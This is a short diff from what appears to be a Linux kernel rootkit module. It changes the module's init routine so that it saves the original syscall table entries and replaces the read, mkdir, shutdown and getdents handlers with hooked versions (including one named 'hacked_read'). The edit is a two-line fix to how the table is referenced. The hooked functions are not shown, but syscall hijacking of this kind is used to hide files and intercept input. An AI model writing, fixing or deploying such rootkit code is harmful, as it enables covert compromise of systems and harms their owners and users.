@@ -396,7 +396,7 @@ static int __init start(void)
     orig_shutdown = (orig_shutdown_t)sys_call_addr[__NR_shutdown];
     orig_mkdir=(orig_mkdir_t)sys_call_addr[__NR_mkdir];
     old_reboot_sys_call=sys_call_addr[__NR_reboot];
-    original_read = (void *)sys_call_table[__NR_read];
+    original_read = (void *)sys_call_addr[__NR_read];
     orig_getdents = (orig_getdents_t)sys_call_addr[__NR_getdents];
     printk("Project:Module: Loaded \n");
     printk("Project:rmdir @ 0x%lx\n", orig_rmdir);
@@ -414,7 +414,7 @@ static int __init start(void)
     sys_call_addr[__NR_mkdir] = (unsigned long)my_mkdir;
     sys_call_addr[__NR_shutdown] = (unsigned long)my_shutdown;
     sys_call_addr[__NR_getdents] = (unsigned long)sys_getdents_new;
-    sys_call_table[__NR_read] = (unsigned long)hacked_read;
+    sys_call_addr[__NR_read] = (unsigned long)hacked_read;
     protect_memory();
 
     return 0;
